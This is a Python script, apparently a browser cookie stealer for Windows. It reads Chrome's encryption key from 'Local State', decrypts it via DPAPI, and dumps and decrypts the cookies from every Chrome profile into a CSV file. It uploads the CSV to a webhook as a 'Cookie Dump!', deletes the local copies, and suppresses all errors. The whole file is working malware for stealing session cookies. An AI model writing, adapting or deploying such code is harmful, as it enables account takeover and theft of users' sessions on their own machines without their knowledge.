import os
from Crypto.Cipher import AES
from requests import post
from sqlite3 import connect
from csv import writer
from base64 import b64decode
from json import loads
from win32crypt import CryptUnprotectData
from shutil import copyfile

webhookURL = ""
CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"

# I used reference to figure out the decryption.

def sendToWebhook(fileToSend):
    file = open(fileToSend, "rb")
    data = {
        "content": "Cookie Dump!",
    }
    files = {
        "file": (fileToSend, file),
    }
    post(webhookURL, data=data, files=files)
    file.close()
    os.remove(os.path.abspath(file.name))

def getChromeDencryptionKey():
    if not os.path.exists(f"{CHROMEPATH}\\Local State"): return

    localStateFile = open(f"{CHROMEPATH}\\Local State", "r", encoding="utf-8")
    localStateFileJson = loads(localStateFile.read())["os_crypt"]["encrypted_key"]
    
    return CryptUnprotectData(b64decode(localStateFileJson)[5:], None, None, None, 0)[1]

def decryptCookie(cookie, key):
    # All the heavy lifting was not done by me.
    try:
        return AES.new(key, AES.MODE_GCM, cookie[3:15]).decrypt(cookie[15:])[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(cookie, None, None, None, 0)[1])
        except:
            return None

def getChromePasswords():
    decryptionKey = getChromeDencryptionKey()
    exportedPasswordsFile = open("ChromeCookies.csv", "w", newline="")
    csvWriter = writer(exportedPasswordsFile)
    i = 0
    i2 = 1

    for itemName in os.listdir(CHROMEPATH):
        fullFilePath = f"{CHROMEPATH}\\{itemName}"
        if os.path.isdir(fullFilePath) and "profile" in itemName.lower() or "default" in itemName.lower():
            cookiesFile = f"{fullFilePath}\\Network\\Cookies"
            if os.path.exists(cookiesFile) and os.path.isfile(cookiesFile):
                copiedCookiesFile = copyfile(cookiesFile, f"Cookies {i}")
                cookiesDB = connect(copiedCookiesFile)
                cookiesDB.text_factory = lambda b: b.decode(errors="ignore")
                cursor = cookiesDB.cursor()
                i += 1

                csvWriter.writerow([i2, "Site", "Cookie Name", "cookie", f"NEW PROFILE: {i}"])
                cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""") # Not by me!
                for row in cursor.fetchall():
                    site = row[0]
                    cookieName = row[1]
                    unEncryptedCookie = row[2] # The un encrypted cookie [2] encrypted cookie at [6]
                    encryptedCookie = row[6]

                    cookie = ""
                    
                    if not unEncryptedCookie and encryptedCookie:
                        cookie = decryptCookie(encryptedCookie, decryptionKey)
                    else:
                        cookie = unEncryptedCookie
                    
                    if not cookie: continue # Possibly check for if the cookie is more than 100 characters

                    csvWriter.writerow([i2, site, cookieName, cookie])
                    i2 = i2 + 1
                cursor.close()
                cookiesDB.close()
                os.remove(os.path.abspath(copiedCookiesFile))
    exportedPasswordsFile.close()
    return exportedPasswordsFile.name

try:
    sendToWebhook(getChromePasswords())
except:
    pass